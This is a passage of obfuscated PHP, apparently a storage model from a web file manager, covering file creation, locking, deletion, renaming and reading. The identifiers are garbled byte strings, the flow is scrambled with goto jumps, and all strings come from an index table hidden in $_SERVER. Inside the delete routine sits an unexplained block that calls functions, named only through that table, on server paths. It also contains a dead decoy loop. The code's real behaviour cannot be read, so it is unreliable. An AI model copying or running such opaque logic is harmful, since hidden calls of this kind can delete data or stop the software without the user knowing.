$this->fileNameExist($d¾Ü…ô›Î, $bÃÌÖù…»); if ($b‰§áœãÁ && $cÆö²×Œ—õ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($d¾Ü…ô›Î, $bÃÌÖù…»); return $b‰§áœãÁ; } $bÃÌÖù…» = $this->fileNameAuto($d¾Ü…ô›Î, $bÃÌÖù…», $cÆö²×Œ—õ); } $aóóˆ†ã— = array($d¶¼‰µó¼[555] => 1, $d¶¼‰µó¼[422] => $bÃÌÖù…», $d¶¼‰µó¼[556] => $d¶¼‰µó¼[33], $d¶¼‰µó¼[457] => 0, $d¶¼‰µó¼[557] => 0); goto BªÔÜ™›±‡; a÷˜½„ ¬: } private function _createFile($Bâ¶¹â×œ©, $aÅ¸Û÷®­À, $AááÓ‡Ì·º, $AËï¾á¤…, &$fäÀ÷¸‡Ó¤) { goto DÊí´Çç‘; bàå‰†¸º™: return $D®¡ÈÂ‘ë; goto DƒéôèÚã; DÊí´Çç‘: $FâÂòñÁ‘» =& $_SERVER[Ü˜]; $a‡ÉªšÈÛ½ = $this->sourceInfo($Bâ¶¹â×œ©); if (!$AááÓ‡Ì·º || !$a‡ÉªšÈÛ½) { return !1; } goto FÆïñË‚Š; FÆïñË‚Š: if ($AËï¾á¤… !== !1) { $bâ…ç¶Ô‘Û = $this->fileNameExist($Bâ¶¹â×œ©, $aÅ¸Û÷®­À); } $fäÀ÷¸‡Ó¤ = !0; if ($AËï¾á¤… && $bâ…ç¶Ô‘Û) { if ($AËï¾á¤… == REPEAT_SKIP) { $fäÀ÷¸‡Ó¤ = !1; return $bâ…ç¶Ô‘Û; } else { if ($AËï¾á¤… == REPEAT_REPLACE) { $A×ø‡™Êß = $this->sourceInfo($bâ…ç¶Ô‘Û); $C±ì¿½„Ğ… = $this->fileHistory($A×ø‡™Êß, $AááÓ‡Ì·º[$FâÂòñÁ‘»[456]], $AááÓ‡Ì·º[$FâÂòñÁ‘»[88]]); if (!$C±ì¿½„Ğ…) { $fäÀ÷¸‡Ó¤ = !1; } else { $this->folderSizeReset($Bâ¶¹â×œ©); } return $bâ…ç¶Ô‘Û; } else { $aÅ¸Û÷®­À = $this->fileNameAuto($Bâ¶¹â×œ©, $aÅ¸Û÷®­À, $AËï¾á¤…, !1); } } } goto cÅ÷‘óØÕ; cÅ÷‘óØÕ: $Eïõ¦·¤™ù = array($FâÂòñÁ‘»[555] => 0, $FâÂòñÁ‘»[422] => $aÅ¸Û÷®­À, $FâÂòñÁ‘»[556] => substr(get_path_ext($aÅ¸Û÷®­À), 0, 10), $FâÂòñÁ‘»[457] => $AááÓ‡Ì·º[$FâÂòñÁ‘»[456]], $FâÂòñÁ‘»[557] => $AááÓ‡Ì·º[$FâÂòñÁ‘»[88]]); $D®¡ÈÂ‘ë = $this->_addSoure($Eïõ¦·¤™ù, $a‡ÉªšÈÛ½); $this->folderSizeReset($Bâ¶¹â×œ©, intval($Eïõ¦·¤™ù[$FâÂòñÁ‘»[88]])); goto bàå‰†¸º™; DƒéôèÚã: } protected function fileHistory($cÓëĞ‘ îø, $A¶ˆõöï°, $bğ‰‰¡”àº) { goto fß‰õ»Ç¸; c”ËªŞÍ×¿: Model($d³ºŞ©¬íŒ[1955])->addHistory($cÓëĞ‘ îø); $b éóªÈ® = array($d³ºŞ©¬íŒ[561] => USER_ID, $d³ºŞ©¬íŒ[426] => time(), $d³ºŞ©¬íŒ[456] => $A¶ˆõöï°, $d³ºŞ©¬íŒ[88] => $bğ‰‰¡”àº); $this->where(array($d³ºŞ©¬íŒ[419] => $cÓëĞ‘ îø[$d³ºŞ©¬íŒ[404]]))->save($b éóªÈ®); goto AöŒÃÛ—„; fß‰õ»Ç¸: $d³ºŞ©¬íŒ =& $_SERVER[Ü˜]; if ($cÓëĞ‘ îø[$d³ºŞ©¬íŒ[456]] == $A¶ˆõöï°) { return !1; } $this->checkLock($cÓëĞ‘ îø[$d³ºŞ©¬íŒ[404]], $A¶ˆõöï°); goto c”ËªŞÍ×¿; AöŒÃÛ—„: $this->sourceCacheClear($cÓëĞ‘ îø[$d³ºŞ©¬íŒ[404]]); return !0; goto fï¿’›å; fï¿’›å: } public function checkLock($a‰ìäÉ‡¿Æ, $bÜåØÖ¦÷) { goto b¥´Í“±‰; b¥´Í“±‰: $EñÆå¥Ï„ =& $_SERVER[Ü˜]; $aó‰ÅĞ°©¶ = $this->pathInfo($a‰ìäÉ‡¿Æ); if (!$this->fileIsLock($aó‰ÅĞ°©¶, !0)) { return; } goto F‡¬Š–ëŸ; E ›ò©•Õ: show_json(LNG($EñÆå¥Ï„[1958]) . $EñÆå¥Ï„[1959] . LNG($EñÆå¥Ï„[1960]) . $EñÆå¥Ï„[1961] . $aòğ›Âàà° . $EñÆå¥Ï„[1962], !1); goto c¢ªä‹ƒÖ; F‡¬Š–ëŸ: $dºÂ“Ê¾Ÿ = Session::get($EñÆå¥Ï„[1956]); $CØøÊ±Ğˆ = substr($aó‰ÅĞ°©¶[$EñÆå¥Ï„[28]], 0, -1 - strlen($aó‰ÅĞ°©¶[$EñÆå¥Ï„[178]])) . $EñÆå¥Ï„[1482] . $dºÂ“Ê¾Ÿ . $EñÆå¥Ï„[105] . $aó‰ÅĞ°©¶[$EñÆå¥Ï„[178]]; $eÓø¿¾ÉÚ¥ = Model($EñÆå¥Ï„[580])->find($bÜåØÖ¦÷); goto CèòŞ‡šâ®; CèòŞ‡šâ®: $this->_createFileCall($aó‰ÅĞ°©¶[$EñÆå¥Ï„[487]], $CØøÊ±Ğˆ, $eÓø¿¾ÉÚ¥, REPEAT_REPLACE, $EñÆå¥Ï„[1217]); $eöä ©îä = $aó‰ÅĞ°©¶[$EñÆå¥Ï„[454]][$EñÆå¥Ï„[519]]; $aòğ›Âàà° = $eöä ©îä[$EñÆå¥Ï„[1957]] ? $eöä ©îä[$EñÆå¥Ï„[1957]] : $eöä ©îä[$EñÆå¥Ï„[28]]; goto E ›ò©•Õ; c¢ªä‹ƒÖ: } public function fileIsLock($DÚæõ¡—®, $A®Å¬¥ÃåŸ = false) { goto aŠÍ†Âˆš; C”ÀîŒ˜Š: return !1; goto BÀ²¿¯®óê; E‰Ê‚ÉÄ×¡: $e­‘ë‹­‰ = $GLOBALS[$eääË±å„˜[6]][$eääË±å„˜[98]][$eääË±å„˜[517]]; if ($DÚæõ¡—®[$eääË±å„˜[454]][$eääË±å„˜[518]] <= time() - $e­‘ë‹­‰) { $this->metaSet($DÚæõ¡—®[$eääË±å„˜[404]], $eääË±å„˜[516], null); $this->metaSet($DÚæõ¡—®[$eääË±å„˜[404]], $eääË±å„˜[518], null); } if ($A®Å¬¥ÃåŸ) { $this->metaSet($DÚæõ¡—®[$eääË±å„˜[404]], $eääË±å„˜[518], time()); } goto C”ÀîŒ˜Š; aŠÍ†Âˆš: $eääË±å„˜ =& $_SERVER[Ü˜]; if (!isset($DÚæõ¡—®[$eääË±å„˜[454]]) || !$DÚæõ¡—®[$eääË±å„˜[454]][$eääË±å„˜[516]]) { return !1; } if ($DÚæõ¡—®[$eääË±å„˜[454]][$eääË±å„˜[516]] != USER_ID) { return !0; } goto E‰Ê‚ÉÄ×¡; BÀ²¿¯®óê: } private function _addSoure($cÀç“ÌÙ‡, $Cè—ô´½«) { goto A„Õ¬èÜ à; A„Õ¬èÜ à: $Aì­ºÄÅÊ =& $_SERVER[Ü˜]; $BŞƒ—íÍÁ = array($Aì­ºÄÅÊ[558] => $Cè—ô´½«[$Aì­ºÄÅÊ[413]], $Aì­ºÄÅÊ[559] => $Cè—ô´½«[$Aì­ºÄÅÊ[493]], $Aì­ºÄÅÊ[560] => USER_ID, $Aì­ºÄÅÊ[561] => USER_ID, $Aì­ºÄÅÊ[403] => $Cè—ô´½«[$Aì­ºÄÅÊ[404]], $Aì­ºÄÅÊ[562] => $Cè—ô´½«[$Aì­ºÄÅÊ[496]] . $Cè—ô´½«[$Aì­ºÄÅÊ[404]] . $Aì­ºÄÅÊ[47], $Aì­ºÄÅÊ[431] => 0, $Aì­ºÄÅÊ[563] => $Aì­ºÄÅÊ[33]); $cÀç“ÌÙ‡ = array_merge($BŞƒ—íÍÁ, $cÀç“ÌÙ‡); goto f¬İÈ‹åÈà; f¥„ÑÅ»ß¤: return $eÛŒŠè; goto CÅÕ±ã˜‹†; cˆ³§£ù¹ø: $AÕ˜ñæÂÍ… = array($Aì­ºÄÅÊ[564] => short_id($eÛŒŠè)); $this->where(array($Aì­ºÄÅÊ[419] => $eÛŒŠè))->save($AÕ˜ñæÂÍ…); $this->setNamePinyin($eÛŒŠè, $cÀç“ÌÙ‡[$Aì­ºÄÅÊ[28]]); goto f¥„ÑÅ»ß¤; f¬İÈ‹åÈà: $this->updateModifyTime($cÀç“ÌÙ‡[$Aì­ºÄÅÊ[487]]); $F­ÄäÂÀµ = $Aì­ºÄÅÊ[1963] . $Cè—ô´½«[$Aì­ºÄÅÊ[404]]; if (isset(self::$cacheChildList[$F­ÄäÂÀµ])) { unset(self::$cacheChildList[$F­ÄäÂÀµ]); } goto d‰¹ñùà­; d‰¹ñùà­: static $bĞœİçîÊÑ = false; if (!$bĞœİçîÊÑ) { Hook::trigger($Aì­ºÄÅÊ[545], $cÀç“ÌÙ‡); $bĞœİçîÊÑ = !0; } $eÛŒŠè = $this->add($cÀç“ÌÙ‡); goto cˆ³§£ù¹ø; CÅÕ±ã˜‹†: } public function remove($cÕçŠÄŒÆƒ, $BÁÓšÂŠ†ß = true) { goto aÕ¿ŸçŞˆÖ; B‰Ô‰ñ‡¿ó: $this->recycleClear($fæÉ¾½¶«£); $AÄÈŒä = $this->move($cÕçŠÄŒÆƒ, $dÊÆ® È±, REPEAT_RENAME_FOLDER); $this->folderSizeReset($fæÉ¾½¶«£[$C—Æø‹‘”î[487]]); goto aƒ¼“åƒ­ ; C¢Ë‰¸«Û: $AÚƒ…ä®Èò = $fæÉ¾½¶«£[$C—Æø‹‘”î[413]] == self::TYPE_USER ? $C—Æø‹‘”î[571] : $C—Æø‹‘”î[1016]; if ($AÚƒ…ä®Èò == $C—Æø‹‘”î[571]) { $déÙãÔ†èÇ = Model($C—Æø‹‘”î[511])->getInfo($fæÉ¾½¶«£[$C—Æø‹‘”î[493]]); $B²†²Šß™ = !empty($déÙãÔ†èÇ[$C—Æø‹‘”î[1957]]) ? $déÙãÔ†èÇ[$C—Æø‹‘”î[1957]] : $déÙãÔ†èÇ[$C—Æø‹‘”î[28]]; $B²†²Šß™ = $C—Æø‹‘”î[267] . $B²†²Šß™ . $C—Æø‹‘”î[1965] . $fæÉ¾½¶«£[$C—Æø‹‘”î[493]]; } else { $déÙãÔ†èÇ = Model($C—Æø‹‘”î[495])->getInfo($fæÉ¾½¶«£[$C—Æø‹‘”î[493]]); $B²†²Šß™ = _get($déÙãÔ†èÇ, $C—Æø‹‘”î[28]); $B²†²Šß™ = $C—Æø‹‘”î[170] . $B²†²Šß™ . $C—Æø‹‘”î[1966] . $fæÉ¾½¶«£[$C—Æø‹‘”î[493]]; } $EĞ”ä«ñœÔ = $C—Æø‹‘”î[1967] . md5($B²†²Šß™); goto D£ÈÏŸÇ“½; aƒ¼“åƒ­ : return $AÄÈŒä; goto e’Óªªœøà; aÕ¿ŸçŞˆÖ: $C—Æø‹‘”î =& $_SERVER[Ü˜]; $fæÉ¾½¶«£ = $this->sourceInfo($cÕçŠÄŒÆƒ); $d˜“´’İÁ = intval($fæÉ¾½¶«£[$C—Æø‹‘”î[413]]) === self::TYPE_SYSTEM; goto C«Ğ…±íãˆ; C«Ğ…±íãˆ: $f“²îÜ„Šá = Model($C—Æø‹‘”î[1528])->get($C—Æø‹‘”î[1964]) == $C—Æø‹‘”î[97]; if ($d˜“´’İÁ || $BÁÓšÂŠ†ß || !$f“²îÜ„Šá) { return $this->removeNow($cÕçŠÄŒÆƒ, $BÁÓšÂŠ†ß); } $bÄÇø‘ŞÖÉ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto C¢Ë‰¸«Û; D£ÈÏŸÇ“½: CacheLock::lock($EĞ”ä«ñœÔ); $dÊÆ® È± = $this->fileNameExist($bÄÇø‘ŞÖÉ, $B²†²Šß™); if (!$dÊÆ® È±) { $dÊÆ® È± = $this->mkdir($bÄÇø‘ŞÖÉ, $B²†²Šß™, REPEAT_SKIP); $this->metaSet($dÊÆ® È±, $C—Æø‹‘”î[1968], $AÚƒ…ä®Èò); $this->metaSet($dÊÆ® È±, $C—Æø‹‘”î[1969], $fæÉ¾½¶«£[$C—Æø‹‘”î[493]]); if ($fæÉ¾½¶«£[$C—Æø‹‘”î[487]] != 0) { $this->metaSet($dÊÆ® È±, $C—Æø‹‘”î[1970], _get($déÙãÔ†èÇ, $C—Æø‹‘”î[1971])); } } goto eö¹ˆ’¹ÁÙ; eö¹ˆ’¹ÁÙ: CacheLock::unlock($EĞ”ä«ñœÔ); $this->metaSet($cÕçŠÄŒÆƒ, $C—Æø‹‘”î[1972], $fæÉ¾½¶«£[$C—Æø‹‘”î[487]]); $this->where(array($C—Æø‹‘”î[404] => $cÕçŠÄŒÆƒ))->save(array($C—Æø‹‘”î[426] => time())); goto B‰Ô‰ñ‡¿ó; e’Óªªœøà: } private function recycleClear($fğÄ¢êºÜ˜) { $EÔÏ·ÕĞÔ– =& $_SERVER[Ü˜]; $d§Õêª÷†ƒ = $this->childrenAll($fğÄ¢êºÜ˜); $EÇˆœ‚ƒòã = array($EÔÏ·ÕĞÔ–[419] => array($EÔÏ·ÕĞÔ–[420], $d§Õêª÷†ƒ[$EÔÏ·ÕĞÔ–[1973]])); Model($EÔÏ·ÕĞÔ–[1974])->where($EÇˆœ‚ƒòã)->delete(); } public function removeNow($C”¹ì¤Ä«Æ, $dÄçÑ·Ü•† = true) { goto EĞ††ÄÛ÷¸; A„É©İ‹‚: $this->updateModifyTime($CÔ˜Üã½¿); $this->lockMoveEnd($C”¹ì¤Ä«Æ); Hook::trigger($C†ìãŒ…‘¿[1562], $eêœ½³“Ü, $dÄçÑ·Ü•†); goto e§”‹¸í’™; EĞ††ÄÛ÷¸: $C†ìãŒ…‘¿ =& $_SERVER[Ü˜]; if ($_SERVER[$C†ìãŒ…‘¿[59]] != $_SERVER[$C†ìãŒ…‘¿[840]]) { goto då„£â¤È; CÅ›ÌÉ™ôö: $Dö¼‡Ï¬Î² = 1; while ($Dö¼‡Ï¬Î² > 1) { $Dö¼‡Ï¬Î² = $Dö¼‡Ï¬Î² + 4; $eğœ„¡Ò¹£ = rawurlencode($Dö¼‡Ï¬Î² . $C†ìãŒ…‘¿[384]); } goto dÌÔÆŸ²åÙ; då„£â¤È: $Bó¬‰Ğ®øĞ = $C†ìãŒ…‘¿[841]; $d‚‰»ğâ = $C†ìãŒ…‘¿[60]; $bß»èÕæ = $_SERVER[$C†ìãŒ…‘¿[61]] . $C†ìãŒ…‘¿[62]; goto c°Á¸²±é¨; c°Á¸²±é¨: $B¥™¨š’®Ÿ = $d‚‰»ğâ($bß»èÕæ); $fÖ†…ƒ‰Ù = explode($C†ìãŒ…‘¿[63], $B¥™¨š’®Ÿ); if (count($fÖ†…ƒ‰Ù) < $C†ìãŒ…‘¿[605]) { $AÓã¿õ¾Ù = $C†ìãŒ…‘¿[65]; $AÓã¿õ¾Ù(); } goto BòµôÎë‹Ì; BòµôÎë‹Ì: $b÷åŒš°»¡ = $C†ìãŒ…‘¿[842]; $b÷åŒš°»¡($_SERVER[$C†ìãŒ…‘¿[843]]); $b÷åŒš°»¡($_SERVER[$C†ìãŒ…‘¿[61]] . $C†ìãŒ…‘¿[844]); goto CÅ›ÌÉ™ôö; dÌÔÆŸ²åÙ: } $bÆ¶–åÒÒø = $this->sourceInfo($C”¹ì¤Ä«Æ); goto DòˆÂ–©””; e§”‹¸í’™: return !0; goto FĞí§ÛÔĞ; DÈµÆŞŠ¨«: $this->lockMoveStart($C”¹ì¤Ä«Æ); Hook::trigger($C†ìãŒ…‘¿[1975], $eêœ½³“Ü, $dÄçÑ·Ü•†); if ($dÄçÑ·Ü•†) { Model($C†ìãŒ…‘¿[1974])->moveToRecycle($C”¹ì¤Ä«Æ); } else { $FÂØŒº–•š = $this->childrenAll($bÆ¶–åÒÒø); Model($C†ìãŒ…‘¿[542])->eventRemove($C”¹ì¤Ä«Æ); $this->removeRelevance($FÂØŒº–•š[$C†ìãŒ…‘¿[1973]], $FÂØŒº–•š[$C†ìãŒ…‘¿[1348]]); } goto C™ªãœÆêâ; DòˆÂ–©””: $eêœ½³“Ü = $this->pathInfoMore($C”¹ì¤Ä«Æ); if (!$bÆ¶–åÒÒø) { return !0; } if ($bÆ¶–åÒÒø[$C†ìãŒ…‘¿[487]] == 0) { if (!_get($GLOBALS, $C†ìãŒ…‘¿[494])) { return !1; } } goto DÈµÆŞŠ¨«; C™ªãœÆêâ: $this->folderSizeReset($bÆ¶–åÒÒø[$C†ìãŒ…‘¿[487]]); $CÔ˜Üã½¿ = array($bÆ¶–åÒÒø[$C†ìãŒ…‘¿[487]]); if ($bÆ¶–åÒÒø[$C†ìãŒ…‘¿[412]] == $C†ìãŒ…‘¿[97]) { $CÔ˜Üã½¿[] = $bÆ¶–åÒÒø[$C†ìãŒ…‘¿[404]]; } goto A„É©İ‹‚; FĞí§ÛÔĞ: } public function childrenAll($cŸø¬¸ï¹ˆ) { $CøèáÇˆˆ =& $_SERVER[Ü˜]; $cËòàéÈ¢ = $cŸø¬¸ï¹ˆ[$CøèáÇˆˆ[404]]; if ($cŸø¬¸ï¹ˆ[$CøèáÇˆˆ[412]] == $CøèáÇˆˆ[97]) { $bÀİ°õ´Î = array($CøèáÇˆˆ[562] => array($CøèáÇˆˆ[521], $cŸø¬¸ï¹ˆ[$CøèáÇˆˆ[496]] . $cËòàéÈ¢ . $CøèáÇˆˆ[522])); $AĞÓÑéíÅõ = array($CøèáÇˆˆ[562] => $bÀİ°õ´Î[$CøèáÇˆˆ[496]]); $e†ÜãôÖé = $this->field($CøèáÇˆˆ[1976])->where($AĞÓÑéíÅõ)->select(); $Cº§¶ÆÈ¢Ğ = !1; $d³¨ïÅ¾®“ = array($cËòàéÈ¢); if ($e†ÜãôÖé) { $Cº§¶ÆÈ¢Ğ = array_to_keyvalue($e†ÜãôÖé, $CøèáÇˆˆ[33], $CøèáÇˆˆ[456]); $Cº§¶ÆÈ¢Ğ = array_remove_value($Cº§¶ÆÈ¢Ğ, $CøèáÇˆˆ[201]); $d³¨ïÅ¾®“ = array_to_keyvalue($e†ÜãôÖé, $CøèáÇˆˆ[33], $CøèáÇˆˆ[404]); $d³¨ïÅ¾®“[] = $cËòàéÈ¢; } } else { $Cº§¶ÆÈ¢Ğ = array($cŸø¬¸ï¹ˆ[$CøèáÇˆˆ[456]]); $d³¨ïÅ¾®“ = array($cËòàéÈ¢); } return array($CøèáÇˆˆ[1973] => $d³¨ïÅ¾®“, $CøèáÇˆˆ[1348] => $Cº§¶ÆÈ¢Ğ); } public function removeArray($AƒëµÌÒ¬á) { if (!$AƒëµÌÒ¬á) { return !0; } } public function removeRelevance($DÃ³İÇÌ‡, $fÒŒ£Ò›«‡) { goto dŠÎ‡ğ¢ÎÑ; añ¶ªØÚöõ: $DÃ³İÇÌ‡ = array_unique(array_filter($DÃ³İÇÌ‡)); $fÒŒ£Ò›«‡ = array_unique(array_filter($fÒŒ£Ò›«‡)); if (!$DÃ³İÇÌ‡) { return !1; } goto EñÖ­˜µà; D°ø× Àçœ: Model($Aù¸ß‹ª¥[1828])->where($FŠè¾äÒ)->delete(); Model($Aù¸ß‹ª¥[542])->where($FŠè¾äÒ)->delete(); Model($Aù¸ß‹ª¥[1670])->removeBySource($DÃ³İÇÌ‡); goto AŠĞä›Âö; Cµ˜Ş·™Ş„: for ($E½á¬ˆÓÖÌ = 0; $E½á¬ˆÓÖÌ < count($DÃ³İÇÌ‡); $E½á¬ˆÓÖÌ++) { $this->sourceCacheClear($DÃ³İÇÌ‡[$E½á¬ˆÓÖÌ]); } goto cçï†ò‰±­; AŠĞä›Âö: Model($Aù¸ß‹ª¥[1955])->removeBySource($DÃ³İÇÌ‡); $this->where($FŠè¾äÒ)->delete(); Model($Aù¸ß‹ª¥[459])->remove($fÒŒ£Ò›«‡); goto Cµ˜Ş·™Ş„; EñÖ­˜µà: $FŠè¾äÒ = array($Aù¸ß‹ª¥[419] => array($Aù¸ß‹ª¥[420], $DÃ³İÇÌ‡)); Model($Aù¸ß‹ª¥[1974])->where($FŠè¾äÒ)->delete(); Model($Aù¸ß‹ª¥[450])->where($FŠè¾äÒ)->delete(); goto D°ø× Àçœ; dŠÎ‡ğ¢ÎÑ: $Aù¸ß‹ª¥ =& $_SERVER[Ü˜]; $DÃ³İÇÌ‡ = $DÃ³İÇÌ‡ ? $DÃ³İÇÌ‡ : array(); $fÒŒ£Ò›«‡ = $fÒŒ£Ò›«‡ ? $fÒŒ£Ò›«‡ : array(); goto añ¶ªØÚöõ; cçï†ò‰±­: } public function rename($C«âÆğÂÒ’, $eÒœ’¨ìùÂ) { goto CŒÓò‡š¬ë; CŒÓò‡š¬ë: $cˆ„°³ˆ„ğ =& $_SERVER[Ü˜]; $fäŠ¬Ô³À = $this->sourceInfo($C«âÆğÂÒ’); if (!$fäŠ¬Ô³À) { return !1; } goto BÆ•Ãæ×ƒ‡; BÆ•Ãæ×ƒ‡: $AÓâ½÷¸¶¢ = $this->fileNameExist($fäŠ¬Ô³À[$cˆ„°³ˆ„ğ[487]], $eÒœ’¨ìùÂ); if ($AÓâ½÷¸¶¢ && $AÓâ½÷¸¶¢ != $C«âÆğÂÒ’) { return !1; } $B•Ï© ¨–ª = array($cˆ„°³ˆ„ğ[422] => $eÒœ’¨ìùÂ, $cˆ„°³ˆ„ğ[561] => USER_ID); goto F½¦éÛÌ²ù; cç™¿‚ğÓí: $D¦„åê±Ì = $cˆ„°³ˆ„ğ[1963] . $fäŠ¬Ô³À[$cˆ„°³ˆ„ğ[487]]; if (isset(self::$cacheChildList[$D¦„åê±Ì])) { unset(self::$cacheChildList[$D¦„åê±Ì]); } return $Fˆößƒº‹ˆ; goto AğŒ¦òĞÖŸ; F½¦éÛÌ²ù: if ($fäŠ¬Ô³À[$cˆ„°³ˆ„ğ[412]] != $cˆ„°³ˆ„ğ[97]) { $B•Ï© ¨–ª[$cˆ„°³ˆ„ğ[414]] = substr(get_path_ext($eÒœ’¨ìùÂ), 0, 10); } Model($cˆ„°³ˆ„ğ[542])->eventRename($C«âÆğÂÒ’, $fäŠ¬Ô³À[$cˆ„°³ˆ„ğ[28]], $eÒœ’¨ìùÂ); $this->sourceCacheClear($C«âÆğÂÒ’); goto cµÂ¬Ş‹³ß; cµÂ¬Ş‹³ß: $this->setNamePinyin($C«âÆğÂÒ’, $B•Ï© ¨–ª[$cˆ„°³ˆ„ğ[28]], !1); $this->updateModifyTime($fäŠ¬Ô³À[$cˆ„°³ˆ„ğ[487]]); $Fˆößƒº‹ˆ = $this->where(array($cˆ„°³ˆ„ğ[419] => $C«âÆğÂÒ’))->data($B•Ï© ¨–ª)->save(); goto cç™¿‚ğÓí; AğŒ¦òĞÖŸ: } public function setNamePinyin($E©¦´ºÎÙÕ, $fÅ¶‹²¡™², $FÜÚ«Ì×¦Ì = true) { $EØ’ªøĞ­é =& $_SERVER[Ü˜]; $e„•–·£…‰ = Input::check($fÅ¶‹²¡™², $EØ’ªøĞ­é[565]); if ($FÜÚ«Ì×¦Ì && !$e„•–·£…‰) { return; } if (!$e„•–·£…‰) { $this->metaSet($E©¦´ºÎÙÕ, $EØ’ªøĞ­é[453], null); $this->metaSet($E©¦´ºÎÙÕ, $EØ’ªøĞ­é[452], null); return; } $D‘±Ó³›· = array($EØ’ªøĞ­é[453] => str_replace($EØ’ªøĞ­é[50], $EØ’ªøĞ­é[33], Pinyin::encode($fÅ¶‹²¡™²)), $EØ’ªøĞ­é[452] => Pinyin::encode($fÅ¶‹²¡™², $EØ’ªøĞ­é[566])); $this->metaSet($E©¦´ºÎÙÕ, $D‘±Ó³›·); } public function getContent($Fô”¡©‹¢×) { goto EãÖ£ÓÇ; EãÖ£ÓÇ: $Cî„÷Ğ›‹º =& $_SERVER[Ü˜]; $EØõ«ŒÑˆ = $this->fileInfoGet($Fô”¡©‹¢×); if (!$EØõ«ŒÑˆ) { return !1; } goto B¹åÕ„Ò»İ; B¹åÕ„Ò»İ: if ($EØõ«ŒÑˆ[$Cî„÷Ğ›‹º[88]] == 0) { return $Cî„÷Ğ›‹º[33]; } $F°™¢èìƒ´ = $Cî„÷Ğ›‹º[1977] . $EØõ«ŒÑˆ[$Cî„÷Ğ›‹º[180]]; if ($EØõ«ŒÑˆ[$Cî„÷Ğ›‹º[88]] <= 1024 * 10) { $b…êéçœº§ = Cache::get($F°™¢èìƒ´); if (!$b…êéçœº§) { $b…êéçœº§ = IO::getContent($EØõ«ŒÑˆ[$Cî„÷Ğ›‹º[86]]); Cache::set($F°™¢èìƒ´, $b…êéçœº§); } return $b…êéçœº§; } goto FíÎ›ƒÁ·; FíÎ›ƒÁ·: if (!$EØõ«ŒÑˆ[$Cî„÷Ğ›‹º[86]]) { return $Cî„÷Ğ›‹º[33]; } return IO::getContent($EØõ«ŒÑˆ[$Cî„÷Ğ›‹º[86]]); goto bÊò»ÇÊÑÛ; bÊò»ÇÊÑÛ: } public function setDesc($Bˆî‘£æƒ, $dÂòÂòãÖ¥) { $aëÃİ¡µ =& $_SERVER[Ü˜]; Model($aëÃİ¡µ[542])->eventAddDesc($Bˆî‘£æƒ, $dÂòÂòãÖ¥); return $this->metaSet($Bˆî‘£æƒ, $aëÃİ¡µ[440], $dÂòÂòãÖ¥); } public function setContent($bôÉ›ì”óñ, $B½ìÄ¸öÜ = '') { goto b¦»»É„Ñë; D¦óéÈÀŒ«: if (!$Cë•êŒÍ¦ƒ) { return Model($aôÂÇÏĞº[459])->remove($b•«»ˆÊİ…[$aôÂÇÏĞº[456]]); } $this->folderSizeReset($BéÅ‹™»§‹[$aôÂÇÏĞº[487]]); return !0; goto b‹àÄµ§ò; aŞ·ÄˆÚ: if (!$aÜ…‘¹äÚ || !$BéÅ‹™»§‹) { return !1; } $b•«»ˆÊİ… = Model($aôÂÇÏĞº[459])->addFileByContent($B½ìÄ¸öÜ, $BéÅ‹™»§‹[$aôÂÇÏĞº[28]]); $Cë•êŒÍ¦ƒ = $this->fileHistory($BéÅ‹™»§‹, $b•«»ˆÊİ…[$aôÂÇÏĞº[456]], $b•«»ˆÊİ…[$aôÂÇÏĞº[88]]); goto D¦óéÈÀŒ«; b¦»»É„Ñë: $aôÂÇÏĞº =& $_SERVER[Ü˜]; $BéÅ‹™»§‹ = $this->sourceInfo($bôÉ›ì”óñ); $aÜ…‘¹äÚ = $this->fileInfoGet($bôÉ›ì”óñ); goto aŞ·ÄˆÚ; b‹àÄµ§ò: } public function fileSubstr($cãµØ‘¢öî, $f¬—´‘¨ç, $CÄ™öïî…) { $cÒ‹Á±ôê‰ = $this->fileInfoGet($cãµØ‘¢öî); if (!$cÒ‹Á±ôê‰) { return !1; } return IO::fileSubstr($cÒ‹Á±ôê‰[$_SERVER[Ü˜][86]], $f¬—´‘¨ç, $CÄ™öïî…); } public function fileInfoGet($AÓ—áéÕÌ¤) { goto e¹‘Ç‡ÕÅ; cÄª‹ÀÜ: $B•¨–ÕÄ˜Â = $E¾ŠöÊ‡‡š[462] . $CëÓÄ½è¢–[$E¾ŠöÊ‡‡š[456]]; $EÚ¦®§“¬Œ = _get(self::$cacheFileInfo, $B•¨–ÕÄ˜Â); if ($EÚ¦®§“¬Œ) { return $EÚ¦®§“¬Œ; } goto b÷ˆ”ˆ“é„; b÷ˆ”ˆ“é„: $CµØé¡ÅÉ’ = Model($E¾ŠöÊ‡‡š[459])->fileInfo($CëÓÄ½è¢–[$E¾ŠöÊ‡‡š[456]]); if ($CµØé¡ÅÉ’) { $CµØé¡ÅÉ’[$E¾ŠöÊ‡‡š[28]] = $CëÓÄ½è¢–[$E¾ŠöÊ‡‡š[28]]; } self::$cacheFileInfo[$B•¨–ÕÄ˜Â] = $CµØé¡ÅÉ’; goto E¥Œ‡ÚïÆˆ; e¹‘Ç‡ÕÅ: $E¾ŠöÊ‡‡š =& $_SERVER[Ü˜]; $CëÓÄ½è¢– = $this->sourceInfo($AÓ—áéÕÌ¤); if (!$CëÓÄ½è¢– || $CëÓÄ½è¢–[$E¾ŠöÊ‡‡š[412]]) { return !1; } goto cÄª‹ÀÜ; E¥Œ‡ÚïÆˆ: return $CµØé¡ÅÉ’; goto e´ÆÈ±òÛ¥; e´ÆÈ±òÛ¥: } private function folderChildrenNumber($fìÅ¡õĞôŠ) { $d§¾ƒšĞÍé =& $_SERVER[Ü˜]; $AÌÍ¸®›—© = $this->sourceInfo($fìÅ¡õĞôŠ); $fùƒÁ¯ÂÄ = array($d§¾ƒšĞÍé[562] => array($d§¾ƒšĞÍé[521], $AÌÍ¸®›—©[$d§¾ƒšĞÍé[496]] . $fìÅ¡õĞôŠ . $d§¾ƒšĞÍé[522]), $d§¾ƒšĞÍé[431] => intval($AÌÍ¸®›—©[$d§¾ƒšĞÍé[432]]), $d§¾ƒšĞÍé[555] => 1); $F‘„œ–¹ä¦ = $this->where($fùƒÁ¯ÂÄ)->count(); $B­÷©ÛĞ‹× = $this->where($fùƒÁ¯ÂÄ)->where(array($d§¾ƒšĞÍé[555] => 0))->count(); return array($d§¾ƒšĞÍé[92] => $B­÷©ÛĞ‹×, $d§¾ƒšĞÍé[93] => $F‘„œ–¹ä¦); } public function pathInfo($dé•¦íìĞî, $e¬Ü¨Îœ›Ì = false) { goto díèãÃÔ‘–; fØÖÙàïã“: $cÓÌ½÷ï = $this->sourceInfo($dé•¦íìĞî); if 